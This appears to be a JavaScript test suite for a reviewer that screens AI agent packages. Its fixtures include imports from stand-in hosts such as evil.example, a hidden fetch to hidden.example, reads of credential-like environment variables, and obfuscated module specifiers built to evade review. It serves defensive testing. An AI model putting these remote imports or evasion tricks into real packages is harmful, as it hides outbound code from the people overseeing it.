  ];
  for (const [specifier, line] of expected) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${JSON.stringify(specifier)}`);
    assert.equal(r.file, PROGRAM_PATH);
    assert.equal(r.line, line, specifier);
  }
});

test("SR-22 refuses a specifier that resolves to no shipped file the way Node resolves it", () => {
  const p = withProgram([
    'const a = require("./x.test");',
    'const b = require("./lib");',
    'import "./TEST/c.mjs";',
    'import "./ghost.mjs";',
    'import "/etc/d.mjs";',
    'import "file:///tmp/e.mjs";',
    'import "data:text/javascript,export default 1";',
    'import f from "#f";',
    'import g from "ticket-reader/g";',
    "",
  ].join("\n"));
  p["skills/read-tickets/scripts/x.test.js"] = "module.exports = 1;\n";
  p["skills/read-tickets/scripts/lib/package.json"] = { main: "./test/b.js" };
  p["skills/read-tickets/scripts/lib/test/b.js"] = "module.exports = 1;\n";
  p["package.json"] = { name: "ticket-reader", imports: { "#f": "./skills/read-tickets/scripts/test/f.mjs" }, exports: { "./g": "./tests/g.mjs" } };
  p["main.cjs"] = 'require("..");\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const expected = [
    ["./x.test", PROGRAM_PATH, 1], ["./lib", PROGRAM_PATH, 2], ["./TEST/c.mjs", PROGRAM_PATH, 3], ["./ghost.mjs", PROGRAM_PATH, 4],
    ["/etc/d.mjs", PROGRAM_PATH, 5], ["file:///tmp/e.mjs", PROGRAM_PATH, 6], ["data:text/javascript,export default 1", PROGRAM_PATH, 7],
    ["#f", PROGRAM_PATH, 8], ["ticket-reader/g", PROGRAM_PATH, 9], ["..", "main.cjs", 1],
  ];
  for (const [specifier, file, line] of expected) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}`);
    assert.equal(r.file, file);
    assert.equal(r.line, line, specifier);
  }
});

test("SR-22 refuses a Python import of a test module however it is written", () => {
  const p = basePackage();
  const fullwidth = String.fromCharCode(0xff54, 0xff45, 0xff53, 0xff54);
  p["skills/read-tickets/scripts/load.py"] = [
    "from . import test",
    "from . tests import a",
    "from \\",
    "    .test.b import c",
    "\ffrom .tests import d",
    "from .pkg import (",
    "    e,",
    "    tests as t,",
    ")",
    "import os, tests.helpers as h",
    "import importlib",
    "m = importlib.import_module('..tests.x', __package__)",
    `from .${fullwidth} import f`,
    "",
  ].join("\n");
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const expected = [
    [".test", 1], [".tests", 2], [".test.b", 3], [".tests", 5], [".pkg.tests", 6], ["tests.helpers", 10], ["..tests.x", 12], [`.${fullwidth}`, 13],
  ];
  for (const [system, line] of expected) {
    const r = (answer.refusals ?? []).find((x) => x.rule === "unread-code" && x.system === system && x.line === line);
    assert.ok(r, `names ${system} at line ${line}`);
    assert.equal(r.file, "skills/read-tickets/scripts/load.py");
  }
});

test("SR-22 reads a Python program as Python reads it: its encoding, its strings and its line endings", () => {
  const bom = String.fromCharCode(0xfeff);
  const dot = String.fromCharCode(0xb7);
  const programs = [
    [`${bom}import tests.helpers\n`, "tests.helpers", 1],
    ["s = f\"{'\"'}\"; import tests.helpers\n", "tests.helpers", 1],
    ['x = f"""{1 # """\n}"""\nimport tests.helpers\n', "tests.helpers", 3],
    ['s = "abc\\\r\nxyz"; import tests.helpers\r\n', "tests.helpers", 2],
    ["import \\\rtests.helpers\n", "tests.helpers", 1],
    [`from tests.a${dot}b import x\n`, `tests.a${dot}b`, 1],
    ['import importlib\nimportlib.import_module(name="tests.helpers")\n', "tests.helpers", 2],
    ["import importlib\nimportlib.import_module('''tests.helpers''')\n", "tests.helpers", 2],
    ['import importlib\nimportlib.import_module(("te" "sts.helpers"))\n', "tests.helpers", 2],
    ['import importlib\nimportlib.import_module("\\N{LATIN SMALL LETTER T}ests")\n', '"\\N{LATIN SMALL LETTER T}ests"', 2],
    ["# -*- coding: utf-7 -*-\n+AGk-mport tests.helpers\n", "coding: utf-7", 1],
    ["# coding: utf.8\nimport os\n", "coding: utf.8", 1],
    ['s = f"{x:{w}{{}"\nimport tests\n', "tests", 2],
    ['import importlib\nimportlib.import_module(package=__package__, name="tests.helpers")\n', "tests.helpers", 2],
  ];
  for (const [text, system, line] of programs) {
    const p = basePackage();
    p["skills/read-tickets/scripts/load.py"] = text;
    const { answer } = review(p);
    const r = (answer?.refusals ?? []).find((x) => x.rule === "unread-code" && x.system === system);
    assert.ok(r, `refuses ${JSON.stringify(text)} as ${system}: ${JSON.stringify(answer?.refusals ?? answer?.result)}`);
    assert.equal(r.file, "skills/read-tickets/scripts/load.py");
    assert.equal(r.line, line, JSON.stringify(text));
  }
});

test("SR-22 passes a Python program that only names an import in a string, or declares UTF-8 by another of Python's names", () => {
  const p = basePackage();
  p["skills/read-tickets/scripts/sig.py"] = "# coding: utf-8-sig\nimport os\n";
  p["skills/read-tickets/scripts/line.py"] = 'import importlib\nimportlib.import_module\n("tests.x")\n';
  p["skills/read-tickets/scripts/us.py"] = "# vim: set fileencoding=US :\nimport os\n";
  p["skills/read-tickets/scripts/text.py"] = [
    's = f"{"; import tests.helpers; "}"',
    't = f"{1 +',
    '2}; import tests.helpers"',
    "u = \"abc\\\r\n; import tests.helpers\"",
    "",
  ].join("\n");
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-22 refuses a URL import that SR-08 does not find, and resolves # imports and exports as Node does", () => {
  const p = withProgram(['import x from "https:evil.example/x.mjs";', basePackage()[PROGRAM_PATH]].join("\n"));
  const r = refusal(review(p).answer, "unread-code", "https:evil.example/x.mjs");
  assert.ok(r, "a URL import with no // is unread code");
  assert.equal(r.line, 1);
  const passes = [
    { "package.json": { name: "ticket-reader", imports: { "#a*": "./skills/read-tickets/scripts/test/a.mjs" } }, program: 'import x from "#a";' },
    { "package.json": { name: "ticket-reader", imports: { "#x": "./skills/read-tickets/scripts/test/x.mjs" } },
      "skills/read-tickets/scripts/package.json": "{ not json", program: 'import x from "#x";' },
    { "package.json": { name: "ticket-reader", exports: { "./sub": "./test/s.mjs", default: "./skills/read-tickets/scripts/shape.mjs" } },
      "skills/read-tickets/scripts/shape.mjs": "export default 1;\n", program: 'import x from "ticket-reader/sub";' },
  ];
  for (const { program, ...files } of passes) {
    const q = withProgram([program, basePackage()[PROGRAM_PATH]].join("\n"));
    Object.assign(q, files);
    const { answer } = review(q);
    assert.equal(answer?.result, "passed", `${program}: ${JSON.stringify(answer?.refusals ?? null)}`);
  }
});

test("SR-22 does not count import text that a literal or a comment only contains", () => {
  const p = withProgram([
    "const help = \"usage: require('./test/x.js')\";",
    'const s = `import x from "./test/a.mjs"`;',
    '// import "./test/b.mjs"',
    'const r = /import "\\.\\/test\\/c"/;',
    'const t = obj.import("./test/d.mjs");',
    basePackage()[PROGRAM_PATH],
  ].join("\n"));
  p["skills/read-tickets/scripts/doc.py"] = '"""Usage:\n    from .tests import helper\n"""\nHELP = "a: from .test import x"\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-22 passes a specifier that resolves to a shipped file, a dependency or a built-in", () => {
  const p = withProgram([
    'import { shape } from "./shape.mjs";',
    'const lib = require("./lib");',
    'const pad = require("left-pad");',
    'import { readFileSync } from "node:fs";',
    'import own from "#own";',
    basePackage()[PROGRAM_PATH],
  ].join("\n"));
  p["skills/read-tickets/scripts/shape.mjs"] = "export const shape = (t) => t;\n";
  p["skills/read-tickets/scripts/lib/index.js"] = "module.exports = {};\n";
  p["package.json"] = { name: "ticket-reader", imports: { "#own": "./skills/read-tickets/scripts/shape.mjs" } };
  p["main.mjs"] = 'import "../ticket-reader/skills/read-tickets/scripts/shape.mjs";\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

// SR-23

test("SR-23 refuses an mcp.json server the descriptor does not declare", () => {
  const p = basePackage();
  p["mcp.json"] = { mcpServers: { "ticket-store": { type: "stdio", command: "./bin/tickets" }, "billing-api": { type: "stdio", command: "./bin/billing" } } };
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const r = refusal(answer, "undeclared-reach", "billing-api");
  assert.ok(r, "names the undeclared server");
  assert.equal(r.file, "mcp.json");
  assert.equal(refusal(answer, "undeclared-reach", "ticket-store"), undefined, "a declared server passes");
});

test("SR-23 refuses an mcp.json that cannot be read", () => {
  for (const body of ["{ not json", "[]\n", `${JSON.stringify({ mcpServers: [] })}\n`, "{}\n", `${JSON.stringify({ servers: {} })}\n`]) {
    const { answer } = review({ ...basePackage(), "mcp.json": body });
    assert.ok(rules(answer).includes("unreadable"), `refuses ${JSON.stringify(body)}`);
  }
  const p = basePackage();
  p["plugin.json"] = { ...p["plugin.json"], mcpServers: "./servers.json" };
  const r = review(p).answer?.refusals?.find((x) => x.rule === "unreadable");
  assert.equal(r?.file, "plugin.json", "a plugin.json that names its servers by path");
});

test("SR-23 refuses an undeclared server in .mcp.json or plugin.json", () => {
  const server = { "billing-api": { type: "stdio", command: "./bin/billing" } };
  for (const [path, body] of [
    [".mcp.json", { mcpServers: server }],
    ["plugin.json", { ...basePackage()["plugin.json"], mcpServers: server }],
    [".claude-plugin/plugin.json", { name: "ticket-reader", mcpServers: server }],
  ]) {
    const p = basePackage();
    p[path] = body;
    const r = refusal(review(p).answer, "undeclared-reach", "billing-api");
    assert.ok(r, `names the server in ${path}`);
    assert.equal(r.file, path);
  }
});

// Spec 0.3.0: tests from the planted bugs round 9 found the suite missing.

// SR-09 and SR-22: JavaScript reads and specifiers (reopen 3, js slice)

test("SR-09 refuses a credential-like variable read through process['env'] in either quotes, naming it and its line", () => {
  const text = [
    "const a = process['env'].ALPHA_TOKEN;",
    'const b = process["env"]["BRAVO_SECRET"];',
    "const { CHARLIE_API_KEY } = process['env'];",
    'const d = process["env"]?.DELTA_PASSWORD;',
    "",
  ].join("\n");
  const { answer } = review(withProgram(text));
  assert.equal(answer?.result, "refused", JSON.stringify(answer?.refusals ?? answer?.result ?? null));
  for (const [name, line] of [["ALPHA_TOKEN", 1], ["BRAVO_SECRET", 2], ["CHARLIE_API_KEY", 3], ["DELTA_PASSWORD", 4]]) {
    const r = refusal(answer, "undeclared-reach", name);
    assert.ok(r, `names ${name}`);
    assert.equal(r.file, PROGRAM_PATH);
    assert.equal(r.line, line, name);
  }
});

test("SR-22 refuses a specifier whose legacy octal escape Node reads as two characters, though a file matches a one-character reading", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/load.cjs`] = 'require("./test\\5710.js");\nrequire("./a\\400.js");\nrequire("./b\\400.js");\n';
  p[`${dir}/test${String.fromCharCode(0o571)}0.js`] = "module.exports = 1;\n";
  p[`${dir}/test/10.js`] = 'fetch("https://hidden.example/");\n';
  p[`${dir}/a${String.fromCharCode(0o400)}.js`] = "module.exports = 1;\n";
  p[`${dir}/b 0.js`] = "module.exports = 1;\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  for (const [specifier, line] of [["./test\\5710.js", 1], ["./a\\400.js", 2]]) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
    assert.equal(r.file, `${dir}/load.cjs`);
    assert.equal(r.line, line, specifier);
  }
  assert.equal(refusal(answer, "unread-code", "./b\\400.js"), undefined, "./b\\400.js is ./b 0.js, which ships");
});

test("SR-22 refuses a specifier with an escape it cannot decode, named as written", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/load.cjs`] = 'const ok = require("./ok.js");\nconst a = require("./\\u{110000}.js");\n';
  p[`${dir}/load.mjs`] = 'import "./ok.js";\nimport "./\\u{FFFFFFFF}.mjs";\n';
  p[`${dir}/ok.js`] = "module.exports = 1;\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "refused", JSON.stringify(answer?.refusals ?? answer?.result ?? null));
  for (const [file, specifier] of [["load.cjs", "./\\u{110000}.js"], ["load.mjs", "./\\u{FFFFFFFF}.mjs"]]) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier} as written`);
    assert.equal(r.file, `${dir}/${file}`);
    assert.equal(r.line, 2, specifier);
  }
  assert.equal(refusal(answer, "unread-code", "./ok.js"), undefined, "./ok.js ships");
  assert.deepEqual(rules(answer).filter((x) => x === "unreadable"), [], "the rest of each program is still read");
});


// Reopen 3, slice "rules": tests for spec 0.3.0.

test("SR-22 passes a Python program that declares any name CPython reads as UTF-8 or ASCII", () => {
  const names = [
    "utf--8", "utf--8-sig", "cp65001", "u8", "utf", "utf8", "utf8_ucs2", "utf8_ucs4", "utf-8-unix", "utf_8_unix",
    "ascii", "646", "ansi_x3.4_1986", "ansi_x3_4_1968", "ansi.x3.4.1968", "cp367", "csascii", "ibm367",
    "iso646_us", "iso_646.irv_1991", "iso_ir_6", "us-ascii", "ascii-", "-ascii",
  ];
  const p = basePackage();
  names.forEach((name, i) => { p[`skills/read-tickets/scripts/enc${i}.py`] = `# coding: ${name}\nimport os\n`; });
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-22 refuses a PEP 263 declaration CPython does not read as UTF-8 or ASCII, at line 1, with a why", () => {
  const p = basePackage();
  p["skills/read-tickets/scripts/dash.py"] = "# coding: -\nimport os\n";
  p["skills/read-tickets/scripts/latin.py"] = "# coding: latin-1\nimport os\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  assert.deepEqual(rules(answer), ["unread-code", "unread-code"], JSON.stringify(answer.refusals));
  for (const [file, system] of [["dash.py", "coding: -"], ["latin.py", "coding: latin-1"]]) {
    const r = refusal(answer, "unread-code", system);
    assert.ok(r, `refuses ${system}: ${JSON.stringify(answer.refusals)}`);
    assert.equal(r.file, `skills/read-tickets/scripts/${file}`);
    assert.equal(r.line, 1, system);
    assert.ok(typeof r.why === "string" && r.why.trim(), `${system} says why`);
  }
});

test("SR-14 refuses a dependency with no lockfile or sha256, a sha256 in another shape, an npm lockfile that is not JSON, or an unpinned npm-shrinkwrap.json", () => {
  const SHRINK = "skills/read-tickets/npm-shrinkwrap.json";
  const lock = (entries) => `${JSON.stringify({ name: "r", lockfileVersion: 3, packages: { "": { name: "r" }, ...entries } }, null, 2)}\n`;
  const pinned = lock({ "node_modules/a": { version: "1.0.0", integrity: "sha512-AAAA" } });
  const one = lock({ "node_modules/p0": { version: "1.0.0" } });
  const second = lock({ "node_modules/p0": { version: "1.0.0", integrity: "sha512-AAAA" }, "node_modules/p1": { version: "1.0.0" } });
  const h = sha256(pinned);
  const cases = [
    ["no lockfile", {}, { skill: "read-tickets" }, undefined],
    ["no sha256", { [LOCK]: pinned }, { skill: "read-tickets", lockfile: LOCK }, LOCK],
    ["sha256: inside the digest", { [LOCK]: pinned }, { skill: "read-tickets", lockfile: LOCK, sha256: `${h.slice(0, 4)}sha256:${h.slice(4)}` }, LOCK],
    ["not JSON", { [LOCK]: "not json\n" }, { skill: "read-tickets", lockfile: LOCK, sha256: sha256("not json\n") }, LOCK],
    ["one entry unpinned", { [SHRINK]: one }, { skill: "read-tickets", lockfile: SHRINK, sha256: sha256(one) }, SHRINK],
    ["the second of two unpinned", { [SHRINK]: second }, { skill: "read-tickets", lockfile: SHRINK, sha256: sha256(second) }, SHRINK],
  ];
  for (const [label, files, entry, file] of cases) {
    const p = basePackage();
    Object.assign(p, files);
    p["agent-runtime-requirements.json"].dependencies = [entry];
    const { answer } = review(p);
    assert.deepEqual(rules(answer), ["dependency-unpinned"], `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
    const r = answer.refusals[0];
    assert.equal(r.file, file, label);
    assert.ok(typeof r.why === "string" && r.why.trim(), `${label} says why`);
  }
});

test("SR-14 passes a version 1 npm lockfile and a sha256: prefix in uppercase hex, and not_checked names no npm lockfile", () => {
  const base = review(basePackage()).answer?.statement?.not_checked;
  assert.ok(Array.isArray(base) && base.length > 0);
  const v1 = `${JSON.stringify({ name: "r", lockfileVersion: 1, dependencies: { a: { version: "1.0.0" } } }, null, 2)}\n`;
  const pinned = `${JSON.stringify({ name: "r", lockfileVersion: 3, packages: { "": { name: "r" }, "node_modules/a": { version: "1.0.0", integrity: "sha512-AAAA" } } }, null, 2)}\n`;
  const p = basePackage();
  p[LOCK] = v1;
  p["skills/v1./package-lock.json"] = pinned;
  p["skills/s/npm-shrinkwrap.json"] = pinned;
  p["agent-runtime-requirements.json"].dependencies = [
    { skill: "read-tickets", lockfile: LOCK, sha256: sha256(v1) },
    { skill: "v1.", lockfile: "skills/v1./package-lock.json", sha256: `sha256:${sha256(pinned).toUpperCase()}` },
    { skill: "s", lockfile: "skills/s/npm-shrinkwrap.json", sha256: `sha256:${sha256(pinned)}` },
  ];
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.not_checked, base);
});

test("SR-22 refuses a # import that a * pattern, a condition or an array maps to unread code", () => {
  const p = withProgram(['import a from "#t/a";', 'import f from "#f";', 'import g from "#g";', basePackage()[PROGRAM_PATH]].join("\n"));
  p["package.json"] = {
    name: "ticket-reader",
    imports: {
      "#t/*": "./skills/read-tickets/scripts/test/*.mjs",
      "#f": { default: "./skills/read-tickets/scripts/test/f.mjs" },
      "#g": ["./skills/read-tickets/scripts/test/g.mjs"],
    },
  };
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  for (const [specifier, line] of [["#t/a", 1], ["#f", 2], ["#g", 3]]) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
    assert.equal(r.file, PROGRAM_PATH);
    assert.equal(r.line, line, specifier);
  }
});

test("SR-22 passes a # import the package.json does not define, or one a pattern maps to a shipped file", () => {
  const cases = [
    [{ "#a": "./skills/read-tickets/scripts/shape.mjs" }, "#b"],
    [undefined, "#x"],
    [{ "#t/*": "./skills/read-tickets/scripts/test/*.mjs" }, "#xyz"],
    [{ "#t/*.mjs": "./skills/read-tickets/scripts/test/*.mjs" }, "#t/a.js"],
    [{ "#a*a": "./skills/read-tickets/scripts/test/x.mjs" }, "#a"],
    [{ "#a*a": "./skills/read-tickets/scripts/test/x.mjs" }, "#aa"],
    [{ "#a*b*c": "./skills/read-tickets/scripts/test/x.mjs" }, "#axxb"],
    [{ "#t/*": "./skills/read-tickets/scripts/*.mjs" }, "#t/shape"],
  ];
  for (const [imports, specifier] of cases) {
    const p = withProgram([`import x from "${specifier}";`, basePackage()[PROGRAM_PATH]].join("\n"));
    p["package.json"] = imports === undefined ? { name: "ticket-reader" } : { name: "ticket-reader", imports };
    p["skills/read-tickets/scripts/shape.mjs"] = "export default 1;\n";
    const { answer } = review(p);
    assert.equal(answer?.result, "passed", `${specifier} with ${JSON.stringify(imports)}: ${JSON.stringify(answer?.refusals ?? null)}`);
  }
});

test("SR-22 passes a require of a folder's main, a .json or .node file, or the package root's index", () => {
  const S = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${S}/load.cjs`] = ['const lib = require("./lib");', 'const data = require("./data");', 'const addon = require("./addon");', 'const root = require("../../..");', ""].join("\n");
  p[`${S}/lib/package.json`] = { main: "./main.js" };
  p[`${S}/lib/main.js`] = "module.exports = 1;\n";
  p[`${S}/data.json`] = "{}\n";
  p[`${S}/addon.node`] = "bin";
  p["index.js"] = "module.exports = 1;\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-22 refuses a require that Node would resolve to an unread main, no ending, a test file or no folder", () => {
  const S = "skills/read-tickets/scripts";
  const J = "module.exports = 1;\n";
  const specifiers = ["./lib1", "./lib2", "./lib3", "./lib4", "./lib5", "./x.test", "./lib6/", "."];
  const p = basePackage();
  p[`${S}/load.cjs`] = `${specifiers.map((s, i) => `const m${i} = require(${JSON.stringify(s)});`).join("\n")}\n`;
  p[`${S}/lib1/package.json`] = { main: "./test/b.js" };
  p[`${S}/lib1/index.js`] = J;
  p[`${S}/lib2/package.json`] = { main: "../../../../../x.js" };
  p[`${S}/lib2/index.js`] = J;
  p[`${S}/lib3/package.json`] = { main: "../../../../../x.js" };
  p[`${S}/lib4/index`] = J;
  p[`${S}/lib5/package.json`] = { main: "./main." };
  p[`${S}/lib5/main.js`] = J;
  p[`${S}/x.test.js`] = J;
  p[`${S}/x.test/index.js`] = J;
  p[`${S}/lib6.js`] = J;
  p["skills/read-tickets/scripts.js"] = J;
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  specifiers.forEach((specifier, i) => {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
    assert.equal(r.file, `${S}/load.cjs`);
    assert.equal(r.line, i + 1, specifier);
  });
});

test("SR-18 names each program in a language it does not read, and an extensionless #! script, and nothing else", () => {
  const base = review(basePackage()).answer?.statement?.not_checked;
  assert.ok(Array.isArray(base) && base.length > 0);
  const named = ["skills/x/run.sh", "skills/x/run.rb", "skills/x/run.go", "skills/x/run.rs", "skills/x/Run.java", "skills/x/run.php", "skills/x/a.sh", "bin/tool"];
  const p = basePackage();
  for (const f of named) p[f] = "echo hi\n";
  p["bin/tool"] = "#!/bin/sh\necho hi\n";
  p["bin/plain"] = "echo hi\n";
  p["skills/x/notes.txt"] = "echo hi\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  const nc = answer.statement.not_checked;
  for (const line of base) assert.ok(nc.includes(line), `still names ${line}`);
  const extra = nc.filter((line) => !base.includes(line));
  for (const f of named) assert.ok(extra.some((line) => line.includes(f)), `names ${f}: ${JSON.stringify(extra)}`);
  for (const line of extra) assert.ok(named.some((f) => line.includes(f)), `names nothing else: ${line}`);
  const body = lockfile(true);
  const locked = review(withDependency(body, { skill: "read-tickets", lockfile: LOCK, sha256: sha256(body) })).answer;
  assert.equal(locked?.result, "passed", JSON.stringify(locked?.refusals ?? null));
  assert.deepEqual(locked.statement.not_checked, base, "a pinned npm lockfile is not named");
});

test("SR-15 gives every refusal a non-blank why, for every rule", () => {
  const p = basePackage();
  const D = p["agent-descriptor.json"];
  const R = p["agent-runtime-requirements.json"];
  D.systems[0].needs = "";
  D.systems.push({ name: "extra-sys", access: "read", needs: "x" }, { name: "spender", access: "read", needs: "to spend" });
  R.systems.push({ name: "spender", kind: "service", spends: { unit: "calls" } });
  R.ceilings = [{ system: "other", per: "task" }, { system: "ticket-store", per: "task", enforced_by: "platform" }, { system: "nobody", per: "day", enforced_by: "runtime" }];
  const loose = `${JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/p0": {} } })}\n`;
  p["skills/read-tickets/package-lock.json"] = loose;
  p["skills/b/package-lock.json"] = "not json\n";
  p["skills/c/package-lock.json"] = loose;
  R.dependencies = [
    { skill: "a" },
    { lockfile: "skills/missing/package-lock.json", sha256: "00" },
    { lockfile: "skills/read-tickets/package-lock.json" },
    { lockfile: "skills/c/package-lock.json", sha256: "ff".repeat(32) },
    { lockfile: "skills/b/package-lock.json", sha256: sha256("not json\n") },
    { lockfile: "skills/read-tickets/package-lock.json", sha256: sha256(loose) },
  ];
  p[PROGRAM_PATH] += 'const k = process.env.BILLING_API_KEY;\nimport u from "./test/u.mjs";\n';
  p["skills/read-tickets/scripts/enc.py"] = "# coding: latin-1\nimport os\n";
  p["references/notes.md"] = `id = ${FAKE.awsAccessKey()}\n`;
  p["mcp.json"] = "{}\n";
  p["plugin.json"] = { name: "ticket-reader", version: "0.1.0", mcpServers: { "undeclared-srv": { command: "x" } } };
  const owner = { spend_limit: { ...LIMIT, per: "week" }, ceilings: [{ system: "ticket-store", per: "task", most: 1 }, { system: "other", per: "task", most: 1 }] };
  const many = review(p, owner).answer;
  assert.equal(many?.result, "refused");
  assert.ok(rules(many).filter((x) => x === "dependency-unpinned").length >= 6, "a refusal for each dependency");
  assert.equal(rules(many).filter((x) => x === "ceiling-missing").length, 3, "one refusal for each ceiling-missing cause");
  const answers = [
    many,
    run("this is not json").answer,
    run(request(join(AGENT, "test", "no-such-package"))).answer,
    review(basePackage(), { ceilings: [] }).answer,
  ];
  const seen = new Set();
  for (const a of answers) {
    assert.equal(a?.result, "refused");
    for (const r of a.refusals) {
      seen.add(r.rule);
      assert.ok(typeof r.why === "string" && r.why.trim(), `a ${r.rule} refusal says why: ${JSON.stringify(r)}`);
    }
  }
  assert.deepEqual([...seen].sort(), [
    "bad-request", "ceiling-missing", "ceiling-unset", "credential-in-files", "dependency-unpinned", "no-reason",
    "spend-limit", "systems-mismatch", "undeclared-reach", "unread-code", "unreadable",
  ]);
});

test("SR-17 gives every accepted_knowingly entry a non-blank what and why", () => {
  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "runtime" }]);
  p["agent-descriptor.json"].systems[0].access = "write";
  p["agent-descriptor.json"].systems[0].leaves = true;
  p[PROGRAM_PATH] = `import { execFile } from "node:child_process";\n${basePackage()[PROGRAM_PATH]}const home = process.env.HOME_DIR;\n`;
  const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: 3 }] });
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  const a = accepted(answer);
  assert.equal(a.length, 5, JSON.stringify(a));
  assert.equal(a.filter((e) => e.system === "ticket-store").length, 3, "access, leaves and the runtime ceiling");
  assert.equal(a.filter((e) => e.file === PROGRAM_PATH).length, 2, "the process start and the variable");
  for (const e of a) {
    for (const k of ["what", "why"]) assert.ok(typeof e[k] === "string" && e[k].trim(), `${k} in ${JSON.stringify(e)}`);
  }
});

test("SR-22 refuses the package's own name where its exports, as a string or as conditions, map it to unread code", () => {
  for (const exports of ["./test/main.mjs", { import: "./test/main.mjs" }]) {
    const p = withProgram(['import x from "ticket-reader";', basePackage()[PROGRAM_PATH]].join("\n"));
    p["package.json"] = { name: "ticket-reader", exports };
    const { answer } = review(p);
    const r = refusal(answer, "unread-code", "ticket-reader");
    assert.ok(r, `exports ${JSON.stringify(exports)}: ${JSON.stringify(answer?.refusals ?? null)}`);
    assert.equal(r.file, PROGRAM_PATH);
    assert.equal(r.line, 1);
  }
});

test("SR-22 passes a self-reference its exports do not map to unread code, and a name that is not the package's own", () => {
  const cases = [
    [{ name: "ticket-reader", exports: null }, "ticket-reader"],
    [{ name: "ticket-reader", exports: { ".": "./skills/read-tickets/scripts/shape.mjs" } }, "ticket-reader"],
    [{ name: "ticket-reader", exports: { "./a": "./test/a.mjs" } }, "ticket-reader/b"],
    [{ name: "ticket-reader", exports: { ".": "./test/main.mjs" } }, "left-pad"],
    [{ name: "ab", exports: { "./c": "./test/c.mjs" } }, "zz/c"],
  ];
  for (const [pkg, specifier] of cases) {
    const p = withProgram([`import x from "${specifier}";`, basePackage()[PROGRAM_PATH]].join("\n"));
    p["package.json"] = pkg;
    p["skills/read-tickets/scripts/shape.mjs"] = "export default 1;\n";
    const { answer } = review(p);
    assert.equal(answer?.result, "passed", `${specifier} with ${JSON.stringify(pkg)}: ${JSON.stringify(answer?.refusals ?? null)}`);
  }
});

test("SR-08 refuses an http, https, ws or wss import once, as undeclared reach, with no unread-code beside it", () => {
  const schemes = ["http", "https", "ws", "wss"];
  const p = basePackage();
  for (const s of schemes) p[`skills/read-tickets/scripts/${s}.mjs`] = `import x from "${s}://evil.example/x.mjs";\nexport default x;\n`;
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const found = answer.refusals.map((r) => [r.rule, r.system, r.file, r.line]).sort();
  assert.deepEqual(found, schemes.map((s) => ["undeclared-reach", "evil.example", `skills/read-tickets/scripts/${s}.mjs`, 1]).sort());
});

test("SR-22 refuses a data: or file: URL that only contains node:, and a drive-letter path", () => {
  const specifiers = ["data:text/javascript,import 'node:fs'", "file:///tmp/node:x.mjs", "C:/x.mjs"];
  const p = withProgram([...specifiers.map((s, i) => `import x${i} from ${JSON.stringify(s)};`), basePackage()[PROGRAM_PATH]].join("\n"));
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  specifiers.forEach((specifier, i) => {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
    assert.equal(r.file, PROGRAM_PATH);
    assert.equal(r.line, i + 1, specifier);
  });
});

test("SR-22 passes a bare name with / or ./ inside, .bin/x, and a # import mapped to a dependency, to nothing or to a shipped file", () => {
  const a = withProgram([
    'import fp from "lodash/fp";',
    'import fp2 from "lodash/./fp";',
    'const bin = require(".bin/x");',
    'import dep from "#dep";',
    'import none from "#none";',
    'import c from "#c";',
    basePackage()[PROGRAM_PATH],
  ].join("\n"));
  a["package.json"] = { name: "ticket-reader", imports: { "#dep": "left-pad", "#none": {}, "#c": "./.config/c.mjs" } };
  a[".config/c.mjs"] = "export default 1;\n";
  const b = withProgram(['import x from "#x";', basePackage()[PROGRAM_PATH]].join("\n"));
  b["skills/read-tickets/scripts/package.json"] = { imports: { "#x": "./shape.mjs" } };
  b["skills/read-tickets/scripts/shape.mjs"] = "export default 1;\n";
  for (const [label, p] of [["bare names and a root map", a], ["a map beside the program", b]]) {
    const { answer } = review(p);
    assert.equal(answer?.result, "passed", `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
  }
});

test("SR-22 refuses a # import where no package.json lies at or above the program, and still answers", () => {
  const p = withProgram(['import x from "#x";', basePackage()[PROGRAM_PATH]].join("\n"));
  p["main.mjs"] = 'import y from "#y";\nexport default y;\n';
  const { status, answer } = review(p);
  assert.equal(status, 0);
  assert.equal(answer?.result, "refused");
  assert.deepEqual(rules(answer), ["unread-code", "unread-code"], JSON.stringify(answer.refusals));
